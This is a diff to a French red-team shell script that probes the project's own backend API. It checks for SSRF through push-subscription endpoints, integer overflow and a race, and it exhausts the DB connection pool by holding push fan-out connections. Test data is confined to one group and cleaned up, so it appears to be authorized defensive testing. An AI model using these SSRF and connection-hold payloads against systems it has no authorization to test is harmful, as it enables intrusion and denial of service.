@@ -9,11 +9,11 @@
 #      (5+10) épuisé → l'API entière ralentit (30 s) puis 500.
 #   E. Gros batch 20 000 ops (F9, info)
 #
-# Tout le contenu d'essai est confiné à UN groupe poubelle créé ici.
-# Les listeners (8098/8099) sont tués à la fin ; le SQL de cleanup est affiché.
+# NOTE 2026-08-27 : le conteneur backend ne JOINT PAS le bridge hôte (172.17.0.1)
+# → les listeners tournent DEDANS le conteneur (127.0.0.1, toujours joignable).
 #
+# Tout le contenu d'essai est confiné à UN groupe poubelle créé ici.
 # Usage:  sh scripts/red-team-keyed.sh
-# Overrides: BACKEND=http://host:port  BACKEND_CONTAINER=ardoise-backend
 set -u
 KEY="$(grep -E '^API_KEY=' .env | cut -d= -f2-)"
 [ -n "$KEY" ] || { echo "API_KEY introuvable dans .env racine"; exit 1; }
@@ -23,6 +23,7 @@ U() { python3 -c 'import uuid;print(uuid.uuid4())'; }
 T() { printf '\n\033[1m### %s\033[0m\n' "$1"; }
 C() { curl -sS --max-time 60 -w '  [HTTP %{http_code}]' "$@"; }
 NOW() { date +%s.%N; }
+BC="${BACKEND_CONTAINER:-ardoise-backend}"
 
 # ------------------------------------------------- découverte backend URL
 B=""
@@ -33,15 +34,9 @@ for c in $CANDS; do
   [ -n "$c" ] || continue
   if curl -sS -o /dev/null -m 2 "$c/api/v1/system/ping" 2>/dev/null; then B="$c"; break; fi
 done
-[ -n "$B" ] || { echo "BACKEND injoignable — tenté: $CANDS"; echo "  → sh scripts/red-team-keyed.sh avec BACKEND=http://host:port en env"; exit 1; }
+[ -n "$B" ] || { echo "BACKEND injoignable — tenté: $CANDS"; echo "  → BACKEND=http://host:port sh scripts/red-team-keyed.sh"; exit 1; }
 echo "backend: $B"
-
-# ------------------------------------------------- docker gateway (vue conteneur)
-GW="172.17.0.1"
-BC="${BACKEND_CONTAINER:-ardoise-backend}"
-GW2="$(docker inspect "$BC" --format '{{range .NetworkSettings.Networks}}{{.Gateway}}{{end}}' 2>/dev/null | awk '{print $1}')"
-[ -n "$GW2" ] && GW="$GW2"
-echo "docker gateway (depuis le conteneur backend): $GW"
+echo "conteneur backend: $BC"
 
 rm -f /tmp/rt-*.txt /tmp/rt-*.log /tmp/rt-*.json
 G="$(U)"
@@ -52,37 +47,36 @@ C "$B/api/v1/groups/register" -X POST -H "$H" -H "$J" -d "{\"groupId\":\"$G\"}";
 
 # ---------------------------------------------------------------- A. SSRF
 T "A. SSRF — le serveur appelle-t-il l'URL d'endpoint qu'on choisit ?"
-python3 - > /tmp/rt-ssrf.log 2>&1 <<'PY' &
+docker exec -i "$BC" python3 - <<'PY' &
 import socket
 s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.bind(("0.0.0.0", 8099)); s.listen(4); s.settimeout(25)
+s.bind(("127.0.0.1", 8099)); s.listen(4); s.settimeout(25)
 try:
     c, a = s.accept()
     data = c.recv(65536)
-    open("/tmp/rt-ssrf-hit.txt","wb").write(data)
+    open("/tmp/rt-hit.txt", "wb").write(data)
     c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
     c.close()
 except socket.timeout:
     pass
 PY
-LSSRF=$!
-sleep 0.5
-SUB='{"endpoint":"http://'"$GW"':8099/ssrf-proof","keys":{"p256dh":"BOrHnQdBa3A0vHmR6GfV8mYqQ3sK9wZpLxT2rUvN4cDe","auth":"k8Jq2mN5xR7tY1zA"},"deviceId":"'"$DEV1"'","groupIds":["'"$G"'"]}'
-echo "-- subscribe endpoint=$GW:8099 :"
+sleep 1
+SUB='{"endpoint":"http://127.0.0.1:8099/ssrf-proof","keys":{"p256dh":"BOrHnQdBa3A0vHmR6GfV8mYqQ3sK9wZpLxT2rUvN4cDe","auth":"k8Jq2mN5xR7tY1zA"},"deviceId":"'"$DEV1"'","groupIds":["'"$G"'"]}'
+echo "-- subscribe endpoint=127.0.0.1:8099 (boucle locale DU CONTENEUR backend) :"
 C "$B/api/v1/push/subscribe" -X POST -H "$H" -H "$J" -d "$SUB"; echo
 echo "-- push 1 op (doit déclencher le fan-out) :"
 C "$B/api/v1/groups/$G/ops" -X POST -H "$H" -H "$J" \
   -d "{\"ops\":[{\"opId\":\"$(U)\",\"groupId\":\"$G\",\"entity\":\"group\",\"entityId\":\"$G\",\"action\":\"create\",\"payload\":{\"name\":\"RT-SSRF\"},\"actor\":\"redteam\",\"lamport\":1,\"createdAt\":1}]}"; echo
 sleep 2
 echo "-- ce que le listener a reçu (preuve SSRF si non vide) :"
-if [ -s /tmp/rt-ssrf-hit.txt ]; then
-  echo "  >>> REÇU SUR LE HOST <<<"
-  head -c 500 /tmp/rt-ssrf-hit.txt; echo
-  echo "  (le SERVEUR a POST vers une URL de notre choix)"
+HIT="$(docker exec "$BC" cat /tmp/rt-hit.txt 2>/dev/null)"
+if [ -n "$HIT" ]; then
+  echo "  >>> REÇU DEDANS LE CONTENEUR BACKEND <<<"
+  printf '%s' "$HIT" | head -c 500; echo
+  echo "  (le SERVEUR a POST vers une URL de notre choix — SSRF confirmé)"
 else
-  echo "  (rien reçu — le fan-out est-il actif ? VAPID_PRIVATE_KEY défini ?)"
+  echo "  (rien reçu — logs listener: cat /tmp/rt-ssrf.log)"
 fi
-kill $LSSRF 2>/dev/null
 
 # ---------------------------------------------------------------- B. Overflow
 T "B. Overflow int (F8)"
@@ -112,22 +106,21 @@ echo "  req1: $(cat /tmp/rt-race1.txt)"; echo "  req2: $(cat /tmp/rt-race2.txt)"
 T "D. DOUBLET — endpoint 'hold' x16 → épuisement du pool DB (5+10) ?"
 echo "-- latence de base (pull, DB) :"
 curl -sS -o /dev/null -w '  baseline: %{time_total}s [%{http_code}]\n' "$B/api/v1/groups/$G/ops?since=0" -H "$H"
-python3 - > /tmp/rt-hold.log 2>&1 <<'PY' &
+echo "-- hold server dans le conteneur (45 s, auto-quit) :"
+docker exec -i "$BC" python3 - <<'PY' &
 import socket, time
 s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.bind(("0.0.0.0", 8098)); s.listen(64); s.settimeout(200)
-n = 0
-end = time.time() + 90
+s.bind(("127.0.0.1", 8098)); s.listen(64); s.settimeout(45)
+n = 0; end = time.time() + 45
 while time.time() < end:
     try:
         c, _ = s.accept(); n += 1
-        if n % 16 == 0: print(n, "connexions holdées", flush=True)
     except socket.timeout:
         break
+print(n, "connexions holdées")
 PY
-LHOLD=$!
-sleep 0.5
-SUBH='{"endpoint":"http://'"$GW"':8098/hold","keys":{"p256dh":"BOrHnQdBa3A0vHmR6GfV8mYqQ3sK9wZpLxT2rUvN4cDe","auth":"k8Jq2mN5xR7tY1zA"},"deviceId":"'"$DEV1"'","groupIds":["'"$G"'"]}'
+sleep 1
+SUBH='{"endpoint":"http://127.0.0.1:8098/hold","keys":{"p256dh":"BOrHnQdBa3A0vHmR6GfV8mYqQ3sK9wZpLxT2rUvN4cDe","auth":"k8Jq2mN5xR7tY1zA"},"deviceId":"'"$DEV1"'","groupIds":["'"$G"'"]}'
 C "$B/api/v1/push/subscribe" -X POST -H "$H" -H "$J" -d "$SUBH" > /dev/null
 echo "-- 16 pushes en parallèle (chacun spawn un fan-out bloqué sur le hold) :"
 PIDS=""
@@ -141,13 +134,14 @@ sleep 2
 echo "-- latence pull PENDANT le hold (attendu : ~30 s puis 500 si pool épuisé) :"
 curl -sS -o /tmp/rt-dos-body.txt -w '  sous hold : %{time_total}s [%{http_code}]\n' --max-time 45 "$B/api/v1/groups/$G/ops?since=0" -H "$H"
 head -c 120 /tmp/rt-dos-body.txt 2>/dev/null; echo
-echo "-- latence ping (pas de DB — doit rester fluide) :"
+echo "-- ping (pas de DB — doit rester fluide) :"
 curl -sS -o /dev/null -w '  ping      : %{time_total}s [%{http_code}]\n' "$B/api/v1/system/ping"
-echo "-- release du hold (tu du server) → récupération :"
-kill $LHOLD 2>/dev/null
-for i in 1 2 3; do
-  curl -sS -o /dev/null -w '  pull i='$i' : %{time_total}s [%{http_code}]\n' --max-time 45 "$B/api/v1/groups/$G/ops?since=0" -H "$H"
-  sleep 1
+echo "-- attente fin du hold (45 s) → récupération :"
+for i in 1 2 3 4 5 6 7 8 9 10 11 12; do
+  sleep 5
+  R="$(curl -sS -o /dev/null -w '%{time_total} %{http_code}' --max-time 45 "$B/api/v1/groups/$G/ops?since=0" -H "$H")"
+  echo "  pull t+$(($i*5))s : $R"
+  case "$R" in *' 200'*) TC=$(echo "$R" | awk '{print $1}'); awk -v t="$TC" 'BEGIN{exit !(t<1)}' && break;; esac
 done
 
 # ---------------------------------------------------------------- E. Batch
@@ -169,5 +163,5 @@ echo
 
 # ---------------------------------------------------------------- cleanup
 printf '\n\033[1m--- NETTOYAGE (MariaDB) ---\033[0m\n'
-printf "DELETE FROM operations WHERE group_id = '%s';\nDELETE FROM push_subscriptions WHERE device_id = '%s';\nDELETE FROM groups WHERE id = '%s';\nrm -f /tmp/rt-*.txt /tmp/rt-*.log /tmp/rt-*.json\n" "$G" "$DEV1" "$G"
-echo "(si un hold est encore en cours au moment du cleanup : pkill -f 'rt-hold' / pkill -f 8098)"
+printf "DELETE FROM operations WHERE group_id = '%s';\nDELETE FROM push_subscriptions WHERE device_id = '%s';\nDELETE FROM groups WHERE id = '%s';\nrm -f /tmp/rt-*.txt /tmp/rt-*.log /tmp/rt-*.json\ndocker exec %s rm -f /tmp/rt-hit.txt\n" "$G" "$DEV1" "$G" "$BC"
+echo "(les listeners s'auto-tuent en 25/45 s — rien à faire)"
